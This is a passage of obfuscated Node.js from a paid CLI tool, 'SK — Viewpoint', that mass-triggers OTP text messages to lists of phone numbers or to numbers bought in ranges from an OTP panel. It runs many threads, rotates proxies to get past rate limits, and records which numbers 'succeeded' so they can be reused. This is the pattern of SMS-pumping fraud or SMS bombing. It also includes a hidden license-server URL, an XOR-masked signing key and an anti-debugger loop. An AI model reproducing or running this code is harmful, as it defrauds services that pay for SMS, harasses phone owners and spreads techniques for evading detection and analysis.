      opts42.phone = _ua;
      return opts42;
    } else {
      const opts43 = {};
      opts43.success = false;
      opts43.message = 'Failed: ' + _mb.m;
      opts43.phone = _ua;
      return opts43;
    }
  } catch (err11) {
    const opts44 = {};
    opts44.success = false;
    opts44.message = 'Failed: Proxy Error';
    opts44.phone = _ua;
    return opts44;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(_ob) {
      const parts5 = '3|2|0|1|4'.split('|');
      let _pb = 0;
      while (true) {
        switch (parts5[_pb++]) {
        case '0':
          this.successful = 0;
          continue;
        case '1':
          this.failed = 0;
          continue;
        case '2':
          this.processed = 0;
          continue;
        case '3':
          this.totalNumbers = _ob;
          continue;
        case '4':
          this.startTime = Date.now();
          continue;
        }
        break;
      }
    }
    addLog(_qb, _rb) {
      let _sb = '';
      const match = _qb.match(/\d{8,}/);
      const _tb = match ? match[0] : '';
      if (_rb === 'success')
        _sb = chalk.hex('#00FF88')('SK \u2014 Viewpoint \u2502 OTP Sent \u2192 ') + chalk.hex('#FCAF45').bold(_tb || _qb);
      else {
        if (_rb === 'retry') {
          _sb = chalk.hex('#FF9900')('SK \u2014 Viewpoint \u2502 Retrying \u2192 ') + chalk.hex('#888888')(_qb);
        } else {
          if (_rb === 'error' || _rb === 'failed') {
            let _ub = _qb.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
            _ub.toLowerCase().includes('proxy') ? _sb = chalk.hex('#FF4466')('SK \u2014 Viewpoint \u2502 Proxy Drop \u2192 ') + chalk.hex('#888888')(_ub) : _sb = chalk.hex('#FF4466')('SK \u2014 Viewpoint \u2502 Failed \u2192 ') + chalk.hex('#FCAF45').bold(_tb) + chalk.hex('#888888')(' (' + _ub + ')');
          } else {
            return;
          }
        }
      }
      process.stdout.write('\r\x1B[K' + _sb + '\n');
      this.render();
    }
    setStatus(_vb) {
    }
    update() {
    }
    render() {
      const _wb = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1);
      const _xb = '  ' + W.bold('VP-V1') + ' \u2B9E [' + this.processed + '/' + this.totalNumbers + '] ' + _wb + '% \u2502 ' + B('Sent: ' + this.successful) + ' \u2502 ' + R('Err: ' + this.failed);
      process.stdout.write('\r\x1B[K' + _xb);
    }
    stop() {
      process.stdout.write('\x1B[2K\r\n');
      const _yb = Math.floor((Date.now() - this.startTime) / 1000);
      const _zb = Math.floor(_yb / 60), _Ab = _yb % 60, _Bb = _zb + 'm ' + _Ab + 's';
      console.log(C('  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
      console.log(C('  \u2551') + W.bold('  VP SMS TRIGGER \u2014 COMPLETE                 ') + C('\u2551'));
      console.log(C('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
      console.log(C('  \u2551') + ('  ' + chalk.greenBright('Successful') + '   ' + chalk.greenBright(String(this.successful).padStart(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u2551') + ('  ' + chalk.red('Failed') + '       ' + chalk.red(String(this.failed).padStart(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u2551') + ('  ' + chalk.cyan('Total Time') + '   ' + chalk.cyan(_Bb.padEnd(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
    }
  }
  async function selectOption(_Cb, _Db) {
    return new Promise(resolve9 => {
      let _Eb = 0;
      process.stdin.resume();
      readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY)
        process.stdin.setRawMode(true);
      const _Fb = () => {
        process.stdout.write('\x1B[2J\x1B[H');
        printHeader();
        console.log('   \x1B[33m' + _Cb + '\x1B[0m\n');
        _Db.forEach((item, index) => {
          if (index === _Eb)
            console.log('   \x1B[36m\u2794\x1B[32m ' + item.name + '\x1B[0m');
          else {
            console.log('     \x1B[90m' + item.name + '\x1B[0m');
          }
        });
      };
      _Fb();
      const _Gb = (_Hb, _Ib) => {
        if (_Ib.ctrl && _Ib.name === 'c') {
          process.exit(0);
        }
        if (_Ib.name === 'up')
          _Eb = (_Eb - 1 + _Db.length) % _Db.length, _Fb();
        else {
          if (_Ib.name === 'down')
            _Eb = (_Eb + 1) % _Db.length, _Fb();
          else
            _Ib.name === 'return' && (process.stdin.setRawMode(false), process.stdin.removeListener('keypress', _Gb), resolve9(_Db[_Eb].value));
        }
      };
      process.stdin.on('keypress', _Gb);
    });
  }
  async function promptText(_Jb, _Kb) {
    return new Promise(resolve10 => {
      process.stdout.write('   \x1B[33m' + _Jb + '\x1B[0m ');
      let _Lb = '';
      if (process.stdin.isTTY)
        process.stdin.setRawMode(false);
      process.stdin.resume();
      const _Mb = _Nb => {
        const _Ob = _Nb.toString();
        if (_Ob.includes('\n') || _Ob.includes('\r')) {
          process.stdin.removeListener('data', _Mb);
          _Lb += _Ob.split(/[\r\n]/)[0];
          let _Pb = _Lb.trim();
          if (_Pb.startsWith('"') && _Pb.endsWith('"'))
            _Pb = _Pb.slice(1, -1);
          else
            _Pb.startsWith('\'') && _Pb.endsWith('\'') && (_Pb = _Pb.slice(1, -1));
          resolve10(_Pb || _Kb);
        } else
          _Lb += _Ob;
      };
      process.stdin.on('data', _Mb);
    });
  }
  async function interactiveWizard() {
    process.stdout.write('\x1B[2J\x1B[H');
    printHeader();
    console.log(W.bold('  --- VIEWPOINT SMS SENDER  ---\n'));
    let _Qb = 'numbers.txt', _Rb = null;
    const _Sb = await selectOption('SELECT NUMBER SOURCE', [
      {
        'name': '\uD83D\uDCC1 Load from file (numbers.txt)',
        'value': 'file'
      },
      {
        'name': '\uD83C\uDF10 Auto fetch from NexaOTP Panel',
        'value': 'nexa'
      }
    ]);
    if (_Sb === 'nexa') {
      let _Tb = '';
      const _Ub = path.join(__dirname, '.nexa_api_key');
      if (fs.existsSync(_Ub)) {
        const _Vb = fs.readFileSync(_Ub, 'utf8').trim(), _Wb = await selectOption('Found saved API Key (...' + _Vb.slice(-4) + '). Use it?', [
            {
              'name': 'Yes, use saved key',
              'value': 'yes'
            },
            {
              'name': 'No, enter new key',
              'value': 'no'
            },
            {
              'name': 'Delete saved key',
              'value': 'delete'
            }
          ]);
        if (_Wb === 'yes') {
          _Tb = _Vb;
        } else {
          if (_Wb === 'delete') {
            fs.unlinkSync(_Ub);
            console.log(G('\n   \u2717 Saved key deleted.\n'));
          }
        }
      }
      if (!_Tb) {
        _Tb = await promptText('Enter NexaOTP API Key:', '');
        const opts45 = {};
        opts45.name = 'No';
        opts45.value = 'no';
        const _Xb = await selectOption('Save this key for future use?', [
          {
            'name': 'Yes, save it',
            'value': 'yes'
          },
          opts45
        ]);
        _Xb === 'yes' && (fs.writeFileSync(_Ub, _Tb, 'utf8'), console.log(G('\n   \u2713 API key saved.\n')));
      }
      let arr3 = [], _Yb = true;
      while (_Yb) {
        const _Zb = await promptText('Enter range #' + (arr3.length + 1) + ' (e.g. 21624485XXX):', '');
        if (_Zb)
          arr3.push(_Zb);
        const _ac = await selectOption('Add another range?', [
          {
            'name': 'Yes',
            'value': 'yes'
          },
          {
            'name': 'No, proceed',
            'value': 'no'
          }
        ]);
        if (_ac === 'no')
          _Yb = false;
      }
      const _bc = await promptText('How many numbers to process? (e.g. 100):', '50'), _cc = parseInt(_bc) || 50, _dc = await selectOption('SELECT NEXA SERVER', [
          {
            'name': 'Server 1 (/get)',
            'value': '/api/v1/numbers/get'
          },
          {
            'name': 'Server 2 (/p2/get)',
            'value': '/api/v1/numbers/p2/get'
          },
          {
            'name': 'Server 3 (/p3/get)',
            'value': '/api/v1/numbers/p3/get'
          }
        ]), opts46 = {};
      opts46.apiKey = _Tb;
      opts46.ranges = arr3;
      opts46.totalCount = _cc;
      opts46.serverEndpoint = _dc;
      _Rb = opts46;
    } else {
      _Qb = await promptText('Enter Numbers File Path [default: numbers.txt]:', 'numbers.txt');
      if (!fs.existsSync(_Qb))
        fs.writeFileSync(_Qb, '');
    }
    let _ec = await promptText('Enter Proxies File Path (Leave blank for direct) [default: none]:', 'none');
    if (_ec === 'none' || _ec === '')
      _ec = '';
    let _fc = await selectOption('SELECT THREADS', [
      {
        'name': '10 Threads',
        'value': 10
      },
      {
        'name': '20 Threads (Default)',
        'value': 20
      },
      {
        'name': '50 Threads (Fast)',
        'value': 50
      },
      {
        'name': '100 Threads (Extreme)',
        'value': 100
      },
      {
        'name': 'Custom',
        'value': 'custom'
      }
    ]);
    if (_fc === 'custom') {
      const _gc = await promptText('Enter custom number of threads:', '20');
      _fc = parseInt(_gc) || 20;
    }
    process.stdin.pause();
    return [
      _Qb,
      String(_fc),
      _ec,
      _Rb
    ];
  }
  function generateHWID() {
    const _hc = require('os'), _ic = _hc.platform();
    try {
      if (_ic === 'win32') {
        const _jc = execSync('powershell -NoProfile -Command "' + '$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; ' + '$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; ' + '$disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; ' + '$mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; ' + 'Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
          'stdio': 'pipe',
          'timeout': 15000
        }).toString().trim();
        if (!_jc)
          throw new Error('No hardware data');
        const _kc = crypto.createHash('sha256').update(_jc).digest('hex').toUpperCase();
        return 'ANKING-7BA3FB09-723F-A500';
      } else {
        let arr4 = [];
        try {
          const _lc = execSync('settings get secure android_id 2>/dev/null || echo ""', {
            'stdio': 'pipe',
            'timeout': 5000
          }).toString().trim();
          if (_lc && _lc !== 'null')
            arr4.push('A:' + _lc);
        } catch (err12) {
        }
        try {
          if (fs.existsSync('/proc/cpuinfo')) {
            const _mc = fs.readFileSync('/proc/cpuinfo', 'utf8'), match2 = _mc.match(/Serial\s*:\s*(\S+)/i), match3 = _mc.match(/Hardware\s*:\s*(.+)/i);
            if (match2 && match2[1] !== '0000000000000000')
              arr4.push('S:' + match2[1].trim());
            if (match3)
              arr4.push('H:' + match3[1].trim());
          }
        } catch (err13) {
        }
        try {
          if (fs.existsSync('/etc/machine-id')) {
            const _nc = fs.readFileSync('/etc/machine-id', 'utf8').trim();
            if (_nc)
              arr4.push('M:' + _nc);
          }
        } catch (err14) {
        }
        try {
          const _oc = _hc.cpus(), _pc = _oc && _oc.length > 0 ? _oc[0].model : 'UnknownCPU', _qc = _hc.totalmem(), _rc = _hc.release(), _sc = _hc.hostname();
          arr4.push('F:' + _pc + '|' + _qc + '|' + _rc + '|' + _sc);
        } catch (err15) {
        }
        const _tc = arr4.join('||'), _uc = crypto.createHash('sha256').update(_tc).digest('hex').toUpperCase();
        return 'ANKING-7BA3FB09-723F-A500';
      }
    } catch (err16) {
      return '';
    }
  }
  function verifyKeySig(_vc, _wc) {
    const arr5 = [
        25,
        55,
        40,
        60,
        43,
        49,
        62,
        40,
        126,
        51,
        33,
        105,
        60,
        41,
        55,
        46
      ], _xc = arr5.map(item2 => String.fromCharCode(item2 ^ 90)).join('');
    if (!_wc.sig)
      return false;
    const _yc = _vc + '|' + (_wc.user || '') + '|' + (_wc.expires || ''), _zc = crypto.createHmac('sha256', _xc).update(_yc).digest('hex');
    return _zc === _wc.sig;
  }
  async function start() {
    const _Ac = generateHWID.toString(), _Bc = crypto.createHash('md5').update(_Ac).digest('hex'), _Cc = generateHWID();
    !_Cc && (console.error(R('\n  \u2717 Could not generate Hardware ID.\n')), process.exit(1));
    const _Dc = generateHWID();
    _Dc !== _Cc && (console.error(R('\n  \u2717 HWID integrity check failed. Tampering detected.\n')), process.exit(1));
    globalHwid = _Cc;
    printHeader();
    console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
    console.log(W('\u2502 [\u2022] Tool      : ') + C('SK \u2014 Viewpoint               ') + W('\u2502'));
    console.log(W('\u2502 [\u2022] Your HWID : ') + Y(_Cc.padEnd(29)) + W('\u2502'));
    console.log(W('\u2502 [\u2022] Status    : ') + Y('Verifying License...         ') + W('\u2502'));
    console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518'));
    console.log('');
    let _Ec = false, _Fc = '';
    try {
      const promise = await new Promise((resolve11, reject4) => {
        const arr6 = [
            104,
            116,
            116,
            112,
            115,
            58,
            47,
            47,
            103,
            105,
            115,
            116,
            46,
            103,
            105,
            116,
            104,
            117,
            98,
            117,
            115,
            101,
            114,
            99,
            111,
            110,
            116,
            101,
            110,
            116,
            46,
            99,
            111,
            109,
            47
          ], arr7 = [
            115,
            99,
            114,
            97,
            112,
            101,
            114,
            107,
            105,
            110,
            103,
            57,
            57,
            47
          ], arr8 = [
            100,
            50,
            51,
            49,
            50,
            56,
            54,
            97,
            50,
            100,
            50,
            51,
            101,
            49,
            55,
            48,
            54,
            97,
            50,
            98,
            52,
            100,
            49,
            48,
            52,
            55,
            56,
            99,
            51,
            55,
            49,
            98,
            47,
            114,
            97,
            119,
            47,
            107,
            101,
            121,
            115,
            46,
            106,
            115,
            111,
            110
          ], _Gc = arr6.map(item3 => String.fromCharCode(item3)).join('') + arr7.map(item4 => String.fromCharCode(item4)).join('') + arr8.map(item5 => String.fromCharCode(item5)).join(''), opts47 = {};
        opts47.timeout = 15000;
        https.get(_Gc + ('?t=' + Date.now()), opts47, _Hc => {
          let _Ic = '';
          _Hc.on('data', _Jc => _Ic += _Jc);
          _Hc.on('end', () => {
            try {
              resolve11(JSON.parse(_Ic));
            } catch (err17) {
              reject4(err17);
            }
          });
        }).on('error', reject4).on('timeout', function () {
          this.destroy();
          reject4(new Error('Timeout'));
        });
      });
      if (promise && promise.keys) {
        const _Kc = promise.keys[_Cc];
        if (!_Kc) {
          const parts6 = '3|6|4|1|5|7|2|0'.split('|');
          let _Lc = 0;
          while (true) {
            switch (parts6[_Lc++]) {
            case '0':
              process.exit(1);
              continue;
            case '1':
              console.error(R('  \u2551  HWID   : ') + Y(_Cc.padEnd(33)) + R('\u2551'));
              continue;
            case '2':
              console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
              continue;
            case '3':
              console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
              continue;
            case '4':
              console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
              continue;
            case '5':
              console.error(R('  \u2551  Status : NOT REGISTERED                    \u2551'));
              continue;
            case '6':
              console.error(R('  \u2551    \u2717 UNAUTHORIZED HARDWARE \u2014 VIEWPOINT    \u2551'));
              continue;
            case '7':
              console.error(R('  \u2551  Contact: t.me/scraper_king to register     \u2551'));
              continue;
            }
            break;
          }
        }
        const _Mc = new Date().toISOString().split('T')[0];
        if (_Kc.expires && _Kc.expires < _Mc) {
          const parts7 = '2|6|1|7|4|5|0|3'.split('|');
          let _Nc = 0;
          while (true) {
            switch (parts7[_Nc++]) {
            case '0':
              console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
              continue;
            case '1':
              console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
              continue;
            case '2':
              console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
              continue;
            case '3':
              process.exit(1);
              continue;
            case '4':
              console.error(R('  \u2551  Expired: ') + Y(_Kc.expires.padEnd(33)) + R('\u2551'));
              continue;
            case '5':
              console.error(R('  \u2551  Contact: t.me/scraper_king to renew       \u2551'));
              continue;
            case '6':
              console.error(R('  \u2551   \u2717 LICENSE EXPIRED \u2014 VIEWPOINT            \u2551'));
              continue;
            case '7':
              console.error(R('  \u2551  HWID   : ') + Y(_Cc.padEnd(33)) + R('\u2551'));
              continue;
            }
            break;
          }
        }
        !verifyKeySig(_Cc, _Kc) && (console.error(R('\n  \u2717 License key signature invalid.\n')), process.exit(1));
        _Ec = true;
        _Fc = _Kc.user || 'Licensed';
      }
    } catch (err18) {
      console.error(R('\n  \u2717 License server unreachable. Internet connection required.\n'));
      process.exit(1);
    }
    !_Ec && (console.error(R('\n  \u2717 License validation failed.\n')), process.exit(1));
    const _Oc = process.argv.slice(2).filter(item6 => !item6.startsWith('--'));
    let _Pc = _Oc;
    if (_Pc.length === 0) {
      _Pc = await interactiveWizard();
    }
    _Pc = _Pc.map(item7 => {
      if (typeof item7 === 'string') {
        if (item7.startsWith('"') && item7.endsWith('"'))
          return item7.slice(1, -1);
        if (item7.startsWith('\'') && item7.endsWith('\''))
          return item7.slice(1, -1);
      }
      return item7;
    });
    let _Qc = path.resolve(_Pc[0] || 'numbers.txt'), _Rc = parseInt(_Pc[1]) || 20;
    let _Sc = _Pc[2] !== undefined ? _Pc[2] : 'proxies.txt';
    if (_Sc.toLowerCase() === 'none' || _Sc === 'false')
      _Sc = '';
    _Sc && !_Sc.includes(':') && !path.isAbsolute(_Sc) && (_Sc = path.resolve(_Sc));
    printHeader();
    console.log(B('  \u2713 License: ' + _Fc) + G(' | HWID: ' + _Cc));
    let _Tc = typeof _Pc[3] === 'object' ? _Pc[3] : null, arr9 = [];
    !_Tc && (!fs.existsSync(_Qc) && (console.error(R('\u2717 Error: Numbers file not found: ' + _Qc)), process.exit(1)), arr9 = fs.readFileSync(_Qc, 'utf8').split(/\r?\n/).map(item8 => item8.trim()).filter(item9 => item9 && item9.replace(/\D/g, '').length >= 7), arr9.length === 0 && (console.error(R('\u2717 No valid phone numbers found in file')), process.exit(1)));
    let arr10 = [];
    if (fs.existsSync(_Sc)) {
      arr10 = fs.readFileSync(_Sc, 'utf8').split('\n').map(item10 => item10.trim()).filter(item11 => item11.length > 0 && !item11.startsWith('#'));
    } else
      _Sc && _Sc !== 'proxies.txt' && _Sc !== '' && (arr10 = [_Sc.trim()]);
    let arr11 = [];
    if (arr10.length > 0) {
      for (const _Uc of arr10) {
        const _Vc = parseProxy(_Uc);
        if (!_Vc) {
          const parts8 = '5|2|0|4|3|6|1'.split('|');
          let _Wc = 0;
          while (true) {
            switch (parts8[_Wc++]) {
            case '0':
              console.error(R('    - host:port'));
              continue;
            case '1':
              process.exit(1);
              continue;
            case '2':
              console.error(R('  Please use one of the supported formats:'));
              continue;
            case '3':
              console.error(R('    - host:port:user:pass'));
              continue;
            case '4':
              console.error(R('    - user:pass@host:port'));
              continue;
            case '5':
              console.error(R('\n  \u2717 Invalid proxy format detected: "' + _Uc + '"'));
              continue;
            case '6':
              console.error(R('    - user:pass:host:port\n'));
              continue;
            }
            break;
          }
        }
        arr11.push(_Vc);
      }
      console.log(Y('\n[*] Loaded ' + arr11.length + ' proxies '));
      arr11 = arr11;
      console.log(G('\u2713 Found ' + arr11.length + ' healthy proxies.\n'));
      if (arr11.length === 0) {
        const opts48 = {};
        opts48.input = process.stdin;
        opts48.output = process.stdout;
        const _Xc = require('readline').createInterface(opts48), promise2 = await new Promise(resolve12 => _Xc.question(R('\n\u2717 All proxies failed health check. Do you want to run with direct connection? (y/n): '), resolve12));
        _Xc.close();
        if (promise2.toLowerCase().trim() === 'y')
          console.log(G('  Proceeding with direct connection...')), arr11 = [];
        else {
          console.error(R('  Aborting.'));
          process.exit(1);
        }
      }
    }
    console.log(Y('\u2713 Loaded ' + arr9.length + ' phone numbers'));
    if (arr11.length === 0)
      console.log(G('  No proxies configured (running direct)'));
    console.log(C('\u2713 Threads: ' + _Rc + '\n'));
    fs.writeFileSync(SUCCESSFUL_FILE, '');
    fs.writeFileSync(FAILED_FILE, '');
    fs.writeFileSync(DEBUG_FILE, '=== DEBUG SESSION ' + new Date().toISOString() + ' ===\n');
    const dashboard = new Dashboard(_Tc ? _Tc.totalCount : arr9.length);
    let _Yc = false;
    let _Zc = false;
    const _ad = () => {
      if (_Tc || _Yc) {
        if (_Yc)
          _Zc = true;
        return;
      }
      _Yc = true;
      fs.writeFile(_Qc, arr9.join('\n'), 'utf8', _bd => {
        _Yc = false;
        if (_Zc) {
          _Zc = false;
          _ad();
        }
      });
    };
    let arr12 = [], arr13 = [], _cd = 0, _dd = false;
    _Tc && (async () => {
      try {
        for (let _ed = 0; _ed < _Tc.totalCount; _ed++) {
          try {
            const _fd = _Tc.ranges[Math.floor(Math.random() * _Tc.ranges.length)], _gd = await nexaLimiter.enqueue(() => nexaFetchNumber(_Tc.apiKey, _fd, _Tc.serverEndpoint));
            _gd && (_cd++, arr13.length > 0 ? arr13.shift()(_gd) : arr12.push(_gd));
          } catch (err19) {
            if (err19.message.includes('Insufficient balance') || err19.message.includes('No numbers available'))
              break;
          }
        }
      } finally {
        _dd = true;
        while (arr13.length > 0)
          arr13.shift()(null);
      }
    })();
    const _hd = _Tc ? () => {
        if (arr12.length > 0)
          return Promise.resolve(arr12.shift());
        if (_dd)
          return Promise.resolve(null);
        return new Promise(resolve13 => arr13.push(resolve13));
      } : () => {
        if (arr9.length === 0)
          return Promise.resolve(null);
        const _id = arr9.splice(Math.floor(Math.random() * arr9.length), 1)[0];
        _Zc = true;
        _ad();
        return Promise.resolve(_id);
      }, _jd = () => {
        if (arr11.length === 0)
          return null;
        const _kd = arr11[Math.floor(Math.random() * arr11.length)];
        return rotateSessionId(_kd).original;
      }, opts49 = {}, arr14 = [], _ld = setInterval(() => dashboard.render(), 500);
    async function _md(_nd) {
      while (true) {
        const _od = await _hd();
        if (!_od)
          break;
        try {
          const _pd = await triggerSms(_od, {
            'onStatus': _qd => dashboard.setStatus('Worker ' + _nd + ': ' + _qd),
            'proxy': _jd()
          });
          if (_pd.success)
            dashboard.successful++, dashboard.processed++, fs.appendFileSync(SUCCESSFUL_FILE, _pd.phone + '|Success\n'), dashboard.addLog('SMS triggered for ' + _pd.phone, 'success');
          else {
            const _rd = _pd.message.includes('Proxy') || _pd.message.includes('socket') || _pd.message.includes('timeout') || _pd.message.includes('ECONNRESET') || _pd.message.includes('Too Many Requests');
            if (_rd) {
              opts49[_pd.phone] = (opts49[_pd.phone] || 0) + 1;
              if (opts49[_pd.phone] < 3) {
                if (!_Tc)
                  arr9.push(_pd.phone);
                dashboard.addLog('Proxy rate-limited/dropped on ' + _pd.phone, 'retry');
                await new Promise(resolve14 => setTimeout(resolve14, 5000));
              } else
                dashboard.failed++, dashboard.processed++, fs.appendFileSync(FAILED_FILE, _pd.phone + '|Max proxy retries reached\n'), dashboard.addLog('Failed on ' + _pd.phone + ': Too many proxy failures', 'error');
            } else {
              dashboard.failed++;
              dashboard.processed++;
              fs.appendFileSync(FAILED_FILE, _pd.phone + '|' + _pd.message + '\n');
              dashboard.addLog('Failed on ' + _pd.phone + ': ' + _pd.message.replace('Failed: ', ''), 'error');
            }
          }
        } catch (err20) {
          opts49[_od] = (opts49[_od] || 0) + 1;
          if (opts49[_od] < 3) {
            if (!_Tc)
              arr9.push(_od);
            dashboard.addLog('Proxy error on ' + _od, 'retry');
            await new Promise(resolve15 => setTimeout(resolve15, 5000));
          } else
            dashboard.failed++, dashboard.processed++, fs.appendFileSync(FAILED_FILE, _od + '|Proxy error\n'), dashboard.addLog('Failed on ' + _od + ': Proxy Drop', 'error');
        }
      }
    }
    const _sd = _Tc ? Math.min(_Rc, _Tc.totalCount) : Math.min(_Rc, arr9.length);
    for (let _td = 0; _td < _sd; _td++) {
      arr14.push(_md(_td));
    }
    await Promise.all(arr14);
    clearInterval(_ld);
    dashboard.render();
    dashboard.stop();
    const _ud = await selectOption('JOB FINISHED', [
      {
        'name': 'Reuse successful numbers (' + SUCCESSFUL_FILE + ')',
        'value': 'reuse'
      },
      {
        'name': 'Return to Main Menu',
        'value': 'home'
      },
      {
        'name': 'Exit',
        'value': 'exit'
      }
    ]);
    if (_ud === 'exit')
      process.exit(0);
    else {
      if (_ud === 'reuse') {
        if (fs.existsSync(SUCCESSFUL_FILE)) {
          let _vd = fs.readFileSync(SUCCESSFUL_FILE, 'utf8').split('\n').map(item12 => item12.split('|')[0].trim()).filter(item13 => item13.length > 5);
          fs.writeFileSync(_Qc, _vd.join('\n'));
          fs.writeFileSync(SUCCESSFUL_FILE, '');
          console.log('\n  \x1B[32m\u2713 Copied ' + _vd.length + ' successful numbers to ' + _Qc + ' and cleared ' + SUCCESSFUL_FILE + '.\x1B[0m\n');
          process.argv = [
            '',
            '',
            _Qc,
            String(_Rc),
            _Sc
          ];
          return start();
        } else {
          console.log('\n  \x1B[31m\u2717 No successful numbers found.\x1B[0m\n');
          process.exit(0);
        }
      } else
        return process.argv = [], start();
    }
  }
  start().catch(err22 => {
    console.error(R('Fatal error: ' + err22.message));
    process.exit(1);
  });
}
function _o(_wd) {
  function _xd(_yd) {
    if (typeof _yd === 'string')
      return function (_zd) {
      }.constructor('while (true) {}').apply('counter');
    else
      ('' + _yd / _yd).length !== 1 || _yd % 20 === 0 ? function () {
        return true;
      }.constructor('debu' + 'gger').call('action') : function () {
        return false;
      }.constructor('debu' + 'gger').apply('stateObject');
    _xd(++_yd);
  }
  try {
    if (_wd)
      return _xd;
    else
      _xd(0);
  } catch (err21) {
  }
}